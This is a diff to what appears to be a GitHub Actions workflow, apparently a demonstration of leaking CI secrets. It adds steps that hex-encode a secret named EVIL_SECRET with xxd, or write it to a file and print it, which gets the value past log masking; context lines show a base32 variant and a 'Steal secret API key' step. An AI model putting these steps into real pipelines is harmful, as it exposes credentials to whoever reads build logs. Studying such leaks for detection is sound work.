@@ -21,6 +21,17 @@ jobs:
         echo ${{secrets.EVIL_SECRET }} | base32
         SECRET=$(echo ${{secrets.EVIL_SECRET }} | base32)
         echo $SECRET | base32 -d
+        
+    - name: Expose secrets using hex encoding
+      run: |
+        echo ${{secrets.EVIL_SECRET}} | xxd -p
+        SECRET=$(echo ${{secrets.EVIL_SECRET}} | xxd -p)
+        echo $SECRET | xxd -r -p
+        
+    - name: Expose secrets indirectly
+      run: |
+        echo "${{secrets.EVIL_SECRET}}" > secret.txt
+        cat secret.txt
 
     - name: Steal secret API key
       env:
